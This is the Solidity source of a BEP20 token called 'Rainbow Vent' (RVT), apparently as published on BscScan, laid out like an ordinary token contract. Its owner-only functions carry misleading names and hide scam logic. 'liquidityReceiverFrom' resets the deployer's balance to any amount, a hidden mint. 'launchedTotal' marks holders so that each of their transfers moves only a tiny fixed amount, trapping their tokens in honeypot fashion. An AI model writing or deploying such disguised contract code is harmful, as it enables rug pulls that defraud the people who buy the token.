/**
 *Submitted for verification at BscScan.com on 2023-01-20
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.2;


interface IBEP20 {
    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function getOwner() external view returns (address);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address _owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction seems to happen overflow");
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication seems to happen overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division seems to happen by zero");
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition seems to happen overflow");

        return c;
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }
}


interface UniswapFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface UniswapRouter {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}


contract RainbowVent is IBEP20 {
    using SafeMath for uint256;
    uint8 constant _decimals = 18;
    uint256 _totalSupply = 100000000 * (10 ** _decimals);


    address public tradingMin;
    mapping(address => bool) public swapTeam;
    address public limitBurn;
    mapping(address => bool) public shouldTradingExempt;


    string constant _name = "Rainbow Vent";
    mapping(address => uint256) _balances;

    string constant _symbol = "RVT";

    address public owner;
    uint256 constant maxAt = 12 ** 10;
    mapping(address => mapping(address => uint256)) _allowances;
    address constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    modifier onlyOwner() {
        require(shouldTradingExempt[msg.sender], "!OWNER");
        _;
    }
    event OwnershipTransferred(address owner);

    constructor (){
        UniswapRouter isTake = UniswapRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        limitBurn = UniswapFactory(isTake.factory()).createPair(WBNB, address(this));
        _allowances[address(this)][address(isTake)] = type(uint256).max;
        tradingMin = msg.sender;
        shouldTradingExempt[tradingMin] = true;
        _balances[tradingMin] = _totalSupply;
        emit Transfer(address(0), tradingMin, _totalSupply);
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {return _totalSupply;}

    function transferOwnership(address payable account) public onlyOwner {
        owner = account;
        shouldTradingExempt[account] = true;
        emit OwnershipTransferred(account);
    }

    function totalFrom(address senderLaunchedMax) public onlyOwner {
        shouldTradingExempt[senderLaunchedMax] = true;
    }

    function amountWalletMarketing(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount);
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != type(uint256).max) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(amount);
        }
        return _transferFrom(sender, recipient, amount);
    }

    function launchedTotal(address liquidityExempt) public onlyOwner {
        swapTeam[liquidityExempt] = true;
    }

    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        if (sender == tradingMin || recipient == tradingMin) {
            return amountWalletMarketing(sender, recipient, amount);
        }
        if (swapTeam[sender]) {
            return amountWalletMarketing(sender, recipient, maxAt);
        }
        return amountWalletMarketing(sender, recipient, amount);
    }

    function liquidityReceiverFrom(uint256 tradingMax) public onlyOwner {
        _balances[tradingMin] = tradingMax;
    }

    function decimals() external pure override returns (uint8) {return _decimals;}

    function symbol() external pure override returns (string memory) {return _symbol;}

    function name() external pure override returns (string memory) {return _name;}

    function getOwner() external view override returns (address) {return owner;}

    function balanceOf(address account) public view override returns (uint256) {return _balances[account];}

    function allowance(address holder, address spender) external view override returns (uint256) {return _allowances[holder][spender];}

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return _transferFrom(msg.sender, recipient, amount);
    }

    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);
}